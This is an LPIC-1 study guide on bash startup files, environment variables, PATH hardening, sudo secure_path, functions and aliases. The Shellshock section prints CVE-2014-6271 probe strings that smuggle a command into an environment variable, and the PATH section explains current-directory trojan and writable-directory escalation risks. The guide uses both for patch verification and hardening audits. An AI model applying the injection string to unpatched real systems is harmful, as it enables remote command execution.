# 105.1 — Customize and Use the Shell Environment

**Certification:** LPIC-1 (LPI 101-500 + 102-500, version 5.0)
**Topic 105.1 — weight 6.25** (Topic 105, *Shells and Shell Scripting*, is examined in **102-500**)
**Key files, terms and utilities:** `.` (dot), `source`, `/etc/bash.bashrc`, `/etc/profile`, `env`, `export`, `set`, `unset`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.bashrc`, `~/.bash_logout`, `function`, `alias`, lists

---

## 1. The production problem: an environment is a contract, not a convenience

### 1.1 Four incident archetypes you will meet in the field

Every SRE eventually debugs a variant of one of these. All four are *the same bug*: an assumption about which startup files a shell reads.

| # | Symptom | Underlying cause |
|---|---|---|
| 1 | "The backup script works when I run it, but the cron job silently produces empty archives." | `cron` spawns a **non-interactive, non-login** shell. It reads neither `/etc/profile` nor `~/.bashrc`. `PATH` is the bare `/usr/bin:/bin`, so `/opt/toolchain/bin/restic` is not found; the pipeline's exit status is masked. |
| 2 | "`ansible` and `rsync` fail against node07 with `Protocol error` / `unexpected tag`." | Someone added `echo "Welcome to $(hostname)"` to `~/.bashrc`. `sshd` runs a non-interactive bash that **does** source `~/.bashrc` (SSH special case), so the banner is injected into the binary protocol stream. |
| 3 | "New hires get the platform aliases, hires from 2023 don't." | The team ships shell config through `/etc/skel`, which is copied **only at account creation**. Two years of drift, no reconciliation loop. |
| 4 | "The Java service starts fine under `systemd` after a manual `systemctl start`, but not at boot; `JAVA_HOME` is unset." | `systemd` does **not** execute a shell. `PAM`, `/etc/profile`, `~/.bashrc` are all bypassed. Unit environment comes only from `Environment=`, `EnvironmentFile=`, `DefaultEnvironment=` and environment generators. |

### 1.2 Why this is a distributed-systems concern, not a dotfile hobby

At fleet scale the shell environment is a **configuration plane** with the same properties as any other:

- **Multiple writers, no coordination.** `/etc/environment` (PAM), `/etc/profile`, `/etc/profile.d/*.sh`, `/etc/bash.bashrc`, `~/.bash_profile`, `~/.bashrc`, `~/.ssh/environment`, `sudoers` `secure_path`, `systemd`'s compiled-in `PATH`, container `ENV` layers. Last writer wins, and "last" depends on the entry point.
- **Context-dependent evaluation.** The same file yields different results under `ssh`, `su -`, `cron`, `systemd`, `kubectl exec`, and a display manager. A configuration you cannot evaluate deterministically is a configuration you cannot review.
- **A security boundary.** `PATH` ordering is a code-execution decision made on every command. A writable directory early in `PATH`, or an empty field (`::`), is a privilege-escalation primitive.
- **A latency budget.** Every login sources the whole chain. A `PROMPT_COMMAND` that shells out to `git status` on a 40 GB monorepo turns every `Enter` keystroke into 300 ms of I/O, on every node, for every operator, forever.

### 1.3 The mental model to hold

> A shell is a state machine whose **initial state** is chosen by two orthogonal booleans — *login* and *interactive* — plus a POSIX-emulation flag. Every environment bug in this topic is a mismatch between the state you assumed and the state you got.

Design rule that follows from it, and the single most valuable takeaway of 105.1:

- **`~/.bash_profile` / `/etc/profile`** → things that must be **inherited by children**: `PATH`, `LANG`, `JAVA_HOME`, `EDITOR`. Exported variables, computed once per session.
- **`~/.bashrc` / `/etc/bash.bashrc`** → things that only make sense to a **human at a keyboard**: aliases, prompt, completion, `shopt`. Never inherited, so they must be re-established per shell.
- **Everything a machine depends on** → an explicit, non-shell mechanism: `EnvironmentFile=`, container `ENV`, `sudoers secure_path`. Never a dotfile.

---

## 2. The startup-file state machine

### 2.1 Classification

| Property | Definition | How bash decides |
|---|---|---|
| **Login shell** | First shell of a session; expected to establish the session environment | `argv[0]` begins with `-` (e.g. `-bash`), or `--login`/`-l` was passed |
| **Interactive** | stdin/stderr attached to a terminal, no non-option arguments | Auto-detected, or forced with `-i` |
| **POSIX mode** | Emulates historical `sh` | Invoked as `sh`, `--posix`, `set -o posix`, or `POSIXLY_CORRECT` set in the environment at startup |

### 2.2 The authoritative decision matrix

Upstream bash behaviour (Bash Reference Manual §6.2, *Bash Startup Files*):

| Invocation | Login | Interactive | Files read, in order | `~/.bash_logout` |
|---|:---:|:---:|---|:---:|
| Console login, `ssh host`, `su -`, `sudo -i`, `bash -l` | ✅ | ✅ | `/etc/profile` → *first readable of* `~/.bash_profile`, `~/.bash_login`, `~/.profile` | ✅ |
| `bash`, `xterm`, `screen`, `tmux`, `su`, `sudo -s` | ❌ | ✅ | `~/.bashrc` (+ `/etc/bash.bashrc` on distros that compile `SYS_BASHRC`) | ❌ |
| `bash script.sh`, `./script.sh`, `cron`, `at` | ❌ | ❌ | **Nothing** — except `$BASH_ENV`, if set and non-empty | ❌ |
| `ssh host 'command'` | ❌ | ❌ | `~/.bashrc` — the network-connection special case | ❌ |
| `bash -lc 'command'` | ✅ | ❌ | `/etc/profile` → `~/.bash_profile`/`~/.bash_login`/`~/.profile` | ✅ |
| Invoked as `sh`, login+interactive | ✅ | ✅ | `/etc/profile` → `~/.profile` only | ❌ |
| Invoked as `sh`, interactive non-login | ❌ | ✅ | `$ENV` only | ❌ |
| Invoked as `sh`, non-interactive | ❌ | ❌ | **Nothing** (`$BASH_ENV` is *not* consulted) | ❌ |
| `--posix`, interactive | – | ✅ | `$ENV` only | ❌ |
| `--noprofile` / `--norc` | – | – | Suppresses the profile chain / the rc file respectively | – |

Three consequences that generate most real tickets:

1. **The profile chain stops at the first hit.** If `~/.bash_profile` exists, `~/.profile` is *never read*. Installing a `~/.bash_profile` is how you silently disable a user's `~/.profile`.
2. **A login shell does not read `~/.bashrc`.** That is why every distro skeleton `~/.bash_profile` contains an explicit `[ -f ~/.bashrc ] && . ~/.bashrc`. Remove it and your aliases vanish from console logins while surviving `tmux`.
3. **`$BASH_ENV` is the only hook into non-interactive shells.** It is also, therefore, an attack surface and a debugging superpower.

### 2.3 Determining the state of the shell you are in — empirically

```bash
$ shopt -q login_shell && echo "login" || echo "non-login"
non-login

$ echo "$-"
himBH

$ [[ $- == *i* ]] && echo "interactive" || echo "non-interactive"
interactive

$ echo "$SHLVL"
1

$ shopt -q -o posix && echo "posix mode" || echo "bash mode"
bash mode
```

`$-` is the set of active single-letter options: `h` hashall, `i` interactive, `m` job control, `B` brace expansion, `H` history expansion. In a script it collapses to `hB` — the missing `i` **is** the diagnosis.

A one-liner probe you can run against any entry point:

```bash
$ cat > /usr/local/bin/shellstate <<'EOF'
#!/usr/bin/env bash
printf 'argv0=%s login=%s interactive=%s posix=%s shlvl=%s\n' \
    "$0" \
    "$(shopt -q login_shell && echo yes || echo no)" \
    "$([[ $- == *i* ]] && echo yes || echo no)" \
    "$(shopt -q -o posix && echo yes || echo no)" \
    "${SHLVL}"
printf 'PATH=%s\n' "$PATH"
EOF
$ chmod 0755 /usr/local/bin/shellstate
```

Now measure every entry point instead of guessing:

```bash
$ shellstate
argv0=/usr/local/bin/shellstate login=no interactive=no posix=no shlvl=2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/toolchain/bin

$ ssh sre@node01 shellstate
argv0=/usr/local/bin/shellstate login=no interactive=no posix=no shlvl=2
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

$ ssh sre@node01 'bash -lc shellstate'
argv0=/usr/local/bin/shellstate login=no interactive=no posix=no shlvl=3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/toolchain/bin
```

The second and third outputs, side by side, are the whole lesson: `ssh host cmd` did **not** get `/opt/toolchain/bin`, because `/etc/profile.d/` was never sourced.

### 2.4 Distribution deltas — do not assume, verify

Upstream bash reads `/etc/bash.bashrc` for interactive non-login shells **only if compiled with `-DSYS_BASHRC`**. Distros differ, and the skeleton files compensate differently.

| Distro | System-wide profile | System-wide rc | Mechanism | `profile.d` interpreter |
|---|---|---|---|---|
| Debian / Ubuntu | `/etc/profile` | `/etc/bash.bashrc` | Compiled `SYS_BASHRC`; `/etc/profile` also sources it for login shells | `/etc/profile` may be read by **dash** → files must be POSIX `sh` |
| RHEL / Fedora / Rocky | `/etc/profile` | `/etc/bashrc` | Sourced **explicitly** by the skeleton `~/.bashrc` | `/etc/profile` sources `*.sh`, skips `*.csh` |
| SUSE | `/etc/profile` (+ `/etc/profile.local`) | `/etc/bash.bashrc` (+ `.local`) | Vendor files are overwritten on update; `.local` is yours | POSIX `sh` |
| Alpine (busybox `ash`) | `/etc/profile` | `$ENV`, conventionally `/etc/shell.shrc` | No bash by default | `ash` |

Verify the compiled-in path rather than trusting documentation:

```bash
$ strings "$(command -v bash)" | grep -E '^/etc/(bash\.)?bashrc$'
/etc/bash.bashrc

$ bash --version | head -1
GNU bash, version 5.2.21(1)-release (x86_64-pc-linux-gnu)
```

**Portability rule for `/etc/profile.d/*.sh`:** on Debian-family systems `/etc/profile` is also executed by `dash` when `sh` is a login shell. Bashisms (`[[ ]]`, arrays, `local` with attributes, `source`) will emit errors into every login. Write `profile.d` snippets in strict POSIX `sh`, and guard bash-only content with `[ -n "${BASH_VERSION-}" ]`.

### 2.5 Entry-point reference: what actually initialises each context

| Entry point | Shell type | PAM session (`/etc/environment`) | Reads `profile.d` | Reads `~/.bashrc` |
|---|---|:---:|:---:|:---:|
| Physical/serial console login (`login`) | login, interactive | ✅ | ✅ | via `~/.bash_profile` hook |
| `sshd` interactive session | login, interactive | ✅ | ✅ | via hook |
| `ssh host 'cmd'` | non-login, non-interactive | ✅ | ❌ | ✅ (network special case) |
| `ssh -t host 'cmd'` | non-login, **interactive** | ✅ | ❌ | ✅ |
| `scp` / `sftp` / `rsync` | non-login, non-interactive | ✅ | ❌ | ✅ ← **output here corrupts the transfer** |
| `su user` | non-login, interactive | ✅ (`su` PAM stack) | ❌ | ✅ |
| `su - user` | login, interactive | ✅ | ✅ | via hook |
| `sudo cmd` | no shell at all | ✅ (`sudo` PAM) | ❌ | ❌ |
| `sudo -i` | login, interactive | ✅ | ✅ | via hook |
| `sudo -s` | non-login, interactive | ✅ | ❌ | ✅ |
| `cron` job | `SHELL=/bin/sh`, non-login, non-interactive | ✅ (`pam_env` via `crond`) | ❌ | ❌ |
| `systemd` service | **no shell** | ❌ | ❌ | ❌ |
| Docker `ENTRYPOINT ["/app"]` | no shell | ❌ | ❌ | ❌ |
| Docker `CMD ["bash","-lc","..."]` | login, non-interactive | ❌ | ✅ | ❌ |
| `kubectl exec -it pod -- bash` | non-login, interactive | ❌ | ❌ | ✅ |
| GNOME/GDM graphical session | `/etc/gdm/Xsession` sources `/etc/profile` + `~/.profile` | ✅ | ✅ | ❌ |

### 2.6 Placement trade-offs: where should a given setting live?

| Location | Scope | Applies to non-interactive? | Inherited by children? | Reconciles on existing hosts? | Use for |
|---|---|:---:|:---:|:---:|---|
| `/etc/environment` (`pam_env`) | All PAM logins, all shells and non-shells | ✅ | ✅ | ✅ | `LANG`, proxy vars — **no expansion, no scripting** |
| `/etc/profile.d/*.sh` | All login shells, all users | ❌ | ✅ | ✅ | `PATH` extensions, `JAVA_HOME`, exported platform vars |
| `/etc/profile` | Same, but vendor-owned | ❌ | ✅ | ⚠️ overwritten on upgrade | Never edit directly |
| `/etc/bash.bashrc` (`/etc/bashrc`) | Interactive bash, all users | ❌ | ❌ | ✅ | Prompt policy, `TMOUT`, global aliases |
| `~/.bash_profile` | One user, login shells | ❌ | ✅ | ❌ (per-user) | Personal exports |
| `~/.bashrc` | One user, interactive shells | ⚠️ SSH case | ❌ | ❌ | Personal aliases, functions |
| `/etc/skel/*` | **Future** users only | – | – | ❌ **never** | Bootstrap defaults only |
| `$BASH_ENV` | Non-interactive bash | ✅ | only if exported | ✅ | Emergency instrumentation; security-sensitive |
| `systemd` `EnvironmentFile=` | One unit | ✅ | ✅ | ✅ | Anything a service depends on |
| `sudoers` `secure_path` | `sudo` invocations | ✅ | ✅ | ✅ | The privileged `PATH` |

---

## 3. Variables: shell state versus process environment

### 3.1 The distinction that everything rests on

A **shell variable** lives in the shell's own memory. An **environment variable** is a member of the `environ` array (`environ(7)`) that `execve(2)` copies into every child process. `export` is the operation that moves a shell variable into the export set.

```bash
$ REGION=eu-central-1            # shell variable only
$ echo "$REGION"
eu-central-1
$ bash -c 'echo "child sees: [$REGION]"'
child sees: []

$ export REGION
$ bash -c 'echo "child sees: [$REGION]"'
child sees: [eu-central-1]

$ declare -p REGION
declare -x REGION="eu-central-1"
```

The `-x` attribute in `declare -p` is the ground truth for "is this exported". Confirm at the kernel level:

```bash
$ tr '\0' '\n' < /proc/$$/environ | grep -c .
34
$ tr '\0' '\n' < /proc/$$/environ | grep '^REGION='
REGION=eu-central-1
```

### 3.2 Tooling comparison

| Command | Reports | Includes non-exported? | Includes functions? | Can modify the child env? | Notes |
|---|---|:---:|:---:|:---:|---|
| `set` | All shell variables **and** functions | ✅ | ✅ | ❌ | With no args in POSIX mode: variables only |
| `set -o` / `shopt -o` | Shell options | – | – | – | Not variables |
| `env` (no args) | Process environment | ❌ | Exported ones only | ✅ | External binary `/usr/bin/env` |
| `printenv` | Process environment | ❌ | ❌ | ❌ | `printenv VAR` exits 1 if unset — scriptable |
| `export -p` | Exported variables | ❌ | – | ❌ | POSIX, re-inputtable |
| `declare -p` | Variables + attributes | ✅ | ❌ | ❌ | Bash-only, shows `-i -a -A -r -x` |
| `compgen -e` | Exported names only | ❌ | ❌ | ❌ | Ideal for scripted diffs |
| `cat /proc/PID/environ` | Env **at exec time** of another process | ❌ | ❌ | ❌ | Does not reflect later `setenv` |

Critical nuance: `/proc/PID/environ` is a snapshot of what `execve()` delivered. A long-running daemon that mutates its own environment will not show the change there. For a running service, trust the unit definition, not `/proc`.

### 3.3 Constructing and destroying environments deliberately

```bash
# Run with a pristine, empty environment
$ env -i /bin/bash --noprofile --norc -c 'env'
PWD=/home/sre
SHLVL=1
_=/usr/bin/env

# Per-command override, no leakage into the parent
$ LC_ALL=C sort -c /etc/passwd ; echo "$LC_ALL"
                                            # empty: the assignment was scoped to sort

# Remove a variable for one command only
$ env -u LD_PRELOAD /opt/app/bin/worker

# Auto-export every subsequent assignment (allexport)
$ set -a
$ . /etc/platform/release.env
$ set +a
$ declare -p PLATFORM_RELEASE
declare -x PLATFORM_RELEASE="2026.08.3"
```

`set -a` + `.` is the idiomatic way to load a `KEY=value` file into the environment; it is exactly what `systemd`'s `EnvironmentFile=` does natively, and it is why those files must not contain shell syntax you would not want executed.

Unsetting and immutability:

```bash
$ unset REGION                  # removes variable and its export attribute
$ export -n JAVA_HOME           # keeps the shell variable, drops the export attribute

$ readonly -p | grep TMOUT
declare -rx TMOUT="900"
$ TMOUT=0
bash: TMOUT: readonly variable
$ unset TMOUT
bash: unset: TMOUT: cannot unset: readonly variable
```

`readonly` is how a hardening baseline enforces an idle-session timeout that an operator cannot casually disable within the shell. It is a policy *speed bump*, not a security control — the user can still `exec bash --norc`.

### 3.4 Scope: subshell versus child process

Two different boundaries, frequently confused:

```bash
$ COUNT=0
$ ( COUNT=99; echo "inside subshell: $COUNT" )
inside subshell: 99
$ echo "after subshell: $COUNT"
after subshell: 0

$ { COUNT=99; }          # group command: SAME shell
$ echo "after group: $COUNT"
after group: 99

$ echo one two three | while read -r a b c; do TOTAL=3; done
$ echo "after pipeline: [${TOTAL-unset}]"
after pipeline: [unset]          # the while ran in a subshell (last-pipeline element)

$ shopt -s lastpipe              # requires job control off (non-interactive, or set +m)
$ set +m
$ echo one two three | while read -r a b c; do TOTAL=3; done
$ echo "after lastpipe: [${TOTAL-unset}]"
after lastpipe: [3]
```

This is the number-one cause of "my loop counter is always zero" in production scripts. A subshell inherits *all* variables (exported or not) but propagates *nothing* back except its exit status.

### 3.5 `pam_env` and `/etc/environment` — the pre-shell layer

`/etc/environment` is **not a shell script**. It is read by `pam_env(8)`, line by line, as `KEY=value`. No `export`, no `$( )`, no conditionals, and — with default settings — no variable expansion.

```bash
$ cat /etc/environment
LANG=en_US.UTF-8
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
HTTPS_PROXY="http://proxy.corp.internal:3128"
NO_PROXY="localhost,127.0.0.1,.svc,.cluster.local,10.0.0.0/8"

$ grep -rn pam_env /etc/pam.d/ | head -5
/etc/pam.d/login:session       required     pam_env.so readenv=1
/etc/pam.d/sshd:session        required     pam_env.so user_readenv=0
/etc/pam.d/su:session          required     pam_env.so readenv=1
/etc/pam.d/cron:session        required     pam_env.so
/etc/pam.d/runuser:session     required     pam_env.so
```

Why it matters: `/etc/environment` reaches **cron and non-shell PAM sessions**, which `/etc/profile.d` cannot. It is the correct place for `LANG` and proxy configuration; it is the wrong place for anything requiring logic.

Note `user_readenv=0` in the `sshd` stack — modern distributions disable `~/.pam_environment` because a user-writable environment file processed by a privileged PAM stack is a classic escalation vector (this was CVE-2010-3316-class territory and the feature is deprecated upstream).

### 3.6 Locale as a correctness dependency

```bash
$ printf 'b\naB\nA\n' | LC_ALL=en_US.UTF-8 sort
A
aB
b
$ printf 'b\naB\nA\n' | LC_ALL=C sort
A
aB
b
$ printf 'Bob\nalice\nAlice\n' | LC_ALL=en_US.UTF-8 sort | tr '\n' ' '
alice Alice Bob
$ printf 'Bob\nalice\nAlice\n' | LC_ALL=C sort | tr '\n' ' '
Alice Bob alice
```

`sort | uniq`, `comm`, `join`, `[a-z]` ranges and `date` output all change with the locale. Remote execution imports the *client's* locale when `sshd` has `AcceptEnv LANG LC_*` (the distro default) and the client sets `SendEnv`. A laptop set to `de_DE.UTF-8` will make a remote script's decimal separator a comma.

**Rule:** every non-interactive script that parses text sets `export LC_ALL=C` (or `C.UTF-8`) at the top. Interactive humans keep their locale.

---

## 4. `PATH` engineering

### 4.1 Semantics you must be exact about

`PATH` is a colon-separated list of directories searched left to right for a command name **containing no slash**. Three properties carry security weight:

| Construct | Meaning | Risk |
|---|---|---|
| `PATH=/usr/bin:/bin` | Two absolute entries | baseline |
| `PATH=:/usr/bin` | **Leading empty field = current directory** | `./ls` trojan |
| `PATH=/usr/bin:` | **Trailing empty field = current directory** | same |
| `PATH=/usr/bin::/bin` | **Empty field in the middle = current directory** | same |
| `PATH=.:/usr/bin` | Explicit CWD, first | worst case |
| `PATH=/usr/bin:.` | Explicit CWD, last | typo-squatting (`sl`, `mkae`) |
| `PATH=~/bin:/usr/bin` | Tilde expanded at assignment time in bash | breaks under `sudo -u` |

Audit it:

```bash
$ printf '%s\n' "${PATH//:/$'\n'}" | cat -A | head
/usr/local/sbin$
/usr/local/bin$
/usr/sbin$
/usr/bin$
/sbin$
/bin$
$                      # <-- empty field: current directory is in PATH

$ awk -F: '{for(i=1;i<=NF;i++) if($i=="" || $i==".") printf "field %d is CWD\n", i}' <<<"$PATH"
field 7 is CWD
```

Find world-writable or group-writable directories in the search path — a finding that belongs in every hardening report:

```bash
$ IFS=: read -ra dirs <<<"$PATH"
$ for d in "${dirs[@]}"; do
>   [ -z "$d" ] && { echo "EMPTY FIELD -> CWD"; continue; }
>   [ -d "$d" ] || { echo "MISSING   $d"; continue; }
>   perm=$(stat -c '%A %U:%G' "$d")
>   case "$perm" in
>     *w*w*|*w*t*) echo "WRITABLE  $d ($perm)" ;;
>     *)           echo "ok        $d ($perm)" ;;
>   esac
> done
ok        /usr/local/sbin (drwxr-xr-x root:root)
ok        /usr/local/bin (drwxr-xr-x root:root)
ok        /usr/sbin (drwxr-xr-x root:root)
ok        /usr/bin (drwxr-xr-x root:root)
ok        /sbin (drwxr-xr-x root:root)
ok        /bin (drwxr-xr-x root:root)
WRITABLE  /opt/vendor/bin (drwxrwxr-x root:developers)
EMPTY FIELD -> CWD
```

### 4.2 An idempotent, POSIX-safe `PATH` mutator

The naïve `export PATH="$PATH:/opt/toolchain/bin"` in `~/.bashrc` grows the variable on every nested shell. After a `tmux` inside an `ssh` inside a `sudo -i`, `PATH` can exceed a kilobyte, and every `execvp()` walks it.

```sh
# POSIX sh — safe for /etc/profile.d/ on Debian (dash) and RHEL (bash)
path_contains() {
    case ":${PATH}:" in
        *":$1:"*) return 0 ;;
        *)        return 1 ;;
    esac
}

path_prepend() {
    [ -d "$1" ] || return 0
    path_contains "$1" && return 0
    PATH="$1${PATH:+:$PATH}"
}

path_append() {
    [ -d "$1" ] || return 0
    path_contains "$1" && return 0
    PATH="${PATH:+$PATH:}$1"
}

path_remove() {
    PATH=$(printf '%s' "$PATH" | awk -v RS=: -v ORS=: -v r="$1" '$0 != r' \
           | sed 's/:$//')
}
```

Demonstration of idempotency:

```bash
$ . /etc/profile.d/10-platform-path.sh
$ echo "$PATH"
/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ . /etc/profile.d/10-platform-path.sh
$ . /etc/profile.d/10-platform-path.sh
$ echo "$PATH"
/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
$ awk -v RS=: 'END{print NR" entries"}' <<<"$PATH"
7 entries
```

### 4.3 The command hash table — the "I upgraded the binary and nothing changed" bug

Bash caches the resolved absolute path of every executed command (option `h`, on by default).

```bash
$ hash
hits	command
   4	/usr/bin/kubectl
   1	/usr/bin/git

$ sudo install -m 0755 kubectl-1.31 /usr/local/bin/kubectl
$ kubectl version --client --output=yaml | head -3
clientVersion:
  gitVersion: v1.29.4          # <-- still the OLD binary from /usr/bin

$ type -a kubectl
kubectl is hashed (/usr/bin/kubectl)
kubectl is /usr/local/bin/kubectl
kubectl is /usr/bin/kubectl

$ hash -r                       # or: hash -d kubectl
$ type kubectl
kubectl is /usr/local/bin/kubectl
$ kubectl version --client --output=yaml | head -3
clientVersion:
  gitVersion: v1.31.0
```

Related controls: `shopt -s checkhash` re-verifies the cached path exists before using it; `set +h` disables hashing entirely (useful in short-lived provisioning shells where binaries appear mid-run).

### 4.4 `PATH` across privilege boundaries

```bash
$ echo "$PATH"
/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ sudo printenv PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ sudo grep -E 'secure_path|env_reset|env_keep' /etc/sudoers
Defaults	env_reset
Defaults	mail_badpass
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults	env_keep += "LANG LC_* http_proxy https_proxy no_proxy"
```

`env_reset` (default) discards the caller's environment except an allowlist; `secure_path` then imposes a fixed `PATH`. This is deliberate: inheriting a user-controlled `PATH` into a root command is a textbook escalation. If your platform tooling must be callable under `sudo`, extend `secure_path` in a dedicated drop-in — never disable `env_reset`.

```bash
$ sudo visudo -f /etc/sudoers.d/20-platform-path
$ sudo cat /etc/sudoers.d/20-platform-path
Defaults    secure_path="/opt/toolchain/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
$ sudo visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/20-platform-path: parsed OK
```

Measured `PATH` per execution context on a stock Debian 12 node:

| Context | Observed `PATH` |
|---|---|
| Interactive login (`ssh`), root | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` |
| Interactive login, unprivileged | `/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games` |
| `ssh host 'printenv PATH'` | `/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games` |
| `crontab -l` user job | `/usr/bin:/bin` (Vixie/ISC cron built-in) |
| `/etc/crontab` / `/etc/cron.d` | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin` (set in the file) |
| `systemd` system service | `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` (compiled default) |
| `sudo cmd` | `secure_path` value |
| Docker `scratch`-derived image | unset → `execvp` uses `confstr(_CS_PATH)` = `/bin:/usr/bin` |

```bash
$ systemctl show-environment
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ systemd-run -q --wait --pipe /usr/bin/printenv PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$ crontab -l | head -3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=sre-oncall@example.com
17 3 * * * /opt/toolchain/bin/backup-run --profile nightly
```

---

## 5. Functions, aliases, builtins and lists

### 5.1 Command resolution order — the reference

When bash executes a simple command whose name contains no slash:

1. **Alias expansion** — performed by the parser, on the first word of a command, and only when aliases are enabled (interactive shells, or `shopt -s expand_aliases`).
2. **Reserved words** (`if`, `for`, `function`, `time`, `[[`, `{`) — recognised when unquoted and in command position.
3. **Shell functions**
4. **Shell builtins** (`cd`, `export`, `read`, `type`, `hash`, `:`)
5. **Hash table**, then **`PATH` search** for external executables

`type -a` renders the whole stack in order and is the correct diagnostic instrument:

```bash
$ alias ls='ls --color=auto'
$ ls() { command ls -lh "$@"; }
$ type -a ls
ls is aliased to `ls --color=auto'
ls is a function
ls () 
{ 
    command ls -lh "$@"
}
ls is /usr/bin/ls

$ type -t ls
alias
$ type -P ls                    # force PATH lookup, skip everything else
/usr/bin/ls
```

Escape hatches, from most to least specific:

| Need | Mechanism | Example |
|---|---|---|
| Skip alias only | Quote or backslash the name | `\ls` or `'ls'` |
| Skip alias **and** function | `command` | `command ls -lh` |
| Force a builtin over a function | `builtin` | `builtin cd /tmp` |
| Force an external binary | Absolute path or `$(type -P x)` | `/usr/bin/time` vs `time` keyword |
| Disable a builtin entirely | `enable -n` | `enable -n echo` → `/usr/bin/echo` wins |

```bash
$ type echo
echo is a shell builtin
$ enable -n echo
$ type echo
echo is /usr/bin/echo
$ enable echo
$ type echo
echo is a shell builtin
```

### 5.2 Function anatomy for production shell code

```bash
# POSIX-portable form (preferred for /etc/profile.d)
retry() {
    _max=$1; shift
    _n=0
    until "$@"; do
        _n=$((_n + 1))
        if [ "$_n" -ge "$_max" ]; then
            printf 'retry: giving up after %d attempts: %s\n' "$_max" "$*" >&2
            return 1
        fi
        sleep $(( _n * 2 ))
    done
    return 0
}

# Bash form with local scoping and strict discipline
kctx() {
    local ctx="${1:?usage: kctx <context>}"
    local -r kubeconfig="${KUBECONFIG:-$HOME/.kube/config}"

    if ! kubectl --kubeconfig="$kubeconfig" config get-contexts -o name \
         | grep -qxF -- "$ctx"; then
        printf 'kctx: unknown context %q\n' "$ctx" >&2
        return 2
    fi
    kubectl --kubeconfig="$kubeconfig" config use-context "$ctx" >/dev/null
    printf 'context -> %s\n' "$ctx"
}
```

Key semantics:

| Feature | Behaviour | Trap |
|---|---|---|
| `local x` | Dynamic scoping: visible to callees, not to caller | Not POSIX; `dash` has a weaker `local` |
| `local x=$(cmd)` | **Exit status is `local`'s, not `cmd`'s** — always `0` | Declare and assign on separate lines under `set -e` |
| `return N` | `0–255`, sets `$?` | `exit` in a *sourced* function kills the login shell |
| `declare -g` | Assign a global from inside a function | Bash 4.2+ |
| `local -n ref=name` | Nameref (pass-by-reference) | Bash 4.3+; circular refs error |
| `local -` | Save/restore `$-` for the function's duration | Bash 4.4+; the clean way to `set -e` locally |
| `FUNCNAME`, `BASH_SOURCE`, `BASH_LINENO` | Call-stack arrays | Index 0 = current frame |
| `declare -ft fn` / `set -o functrace` | `DEBUG`/`RETURN` traps inherited into the function | Required for shell profilers |

The `local` exit-status trap, demonstrated because it silently defeats `set -e` in real code:

```bash
$ f() { set -e; local v=$(false); echo "reached, status=$?"; }
$ f
reached, status=0
$ g() { set -e; local v; v=$(false); echo "NOT reached"; }
$ g
$ echo "g returned $?"
g returned 1
```

Stack introspection for error reporting:

```bash
$ trace() { printf 'called from %s:%s in %s()\n' \
>     "${BASH_SOURCE[1]}" "${BASH_LINENO[0]}" "${FUNCNAME[1]}"; }
$ outer() { trace; }
$ outer
called from main:1 in outer()
```

### 5.3 Exported functions and the Shellshock lesson

Bash can export functions to child bash processes through the environment:

```bash
$ platform_region() { echo "eu-central-1"; }
$ export -f platform_region
$ bash -c 'platform_region'
eu-central-1

$ env | grep -A2 BASH_FUNC
BASH_FUNC_platform_region%%=() {  echo "eu-central-1"
}
```

Before the 2014 patches, the encoding was `platform_region=() { ...; }` — an ordinary-looking variable name. Any process that copied untrusted input into an environment variable (`mod_cgi` writing `HTTP_*`, DHCP clients, `ForceCommand` in `sshd`) handed bash a function definition, and bash executed trailing text after the closing brace. That is **CVE-2014-6271** ("Shellshock"), with follow-ups CVE-2014-7169, 6277, 6278, 7186, 7187.

The fix was namespacing: the importable form is now `BASH_FUNC_name%%`, which CGI's `HTTP_`-prefix mangling cannot produce. Verification on a patched build:

```bash
$ env 'x=() { :;}; echo VULNERABLE' bash -c 'echo probe-ok'
probe-ok
$ env 'BASH_FUNC_x%%=() { :;}; echo VULNERABLE' bash -c 'echo probe-ok'
bash: warning: BASH_FUNC_x%%: ignoring function definition attempt
bash: error importing function definition for `BASH_FUNC_x%%'
probe-ok
```

Operational conclusion, and it is stronger than "patch your systems": **do not use `export -f` as an architecture.** Function export is a bash-to-bash side channel that is invisible to `env | grep`-style review, invisible to `systemd` unit inspection, and unavailable to any other interpreter. Ship shared shell code as a **library file** that consumers explicitly source.

### 5.4 Alias vs function vs script — the selection table

| Dimension | Alias | Function | Script in `PATH` |
|---|---|---|---|
| Accepts positional parameters | ❌ (text prepend only) | ✅ `$1 $@ $#` | ✅ |
| Available in non-interactive shells | ❌ unless `shopt -s expand_aliases` | ✅ if sourced/exported | ✅ always |
| Can modify the calling shell (`cd`, `export`) | ✅ | ✅ | ❌ (child process) |
| Callable from `xargs`, `find -exec`, `sudo`, `systemd` | ❌ | ❌ | ✅ |
| Recursion / local variables / return codes | ❌ | ✅ | ✅ |
| Process-creation cost | none | none | one `fork`+`execve` |
| Testable in CI (`bats`, `shellcheck`) | ✗ awkward | ✓ via sourcing | ✓ natively |
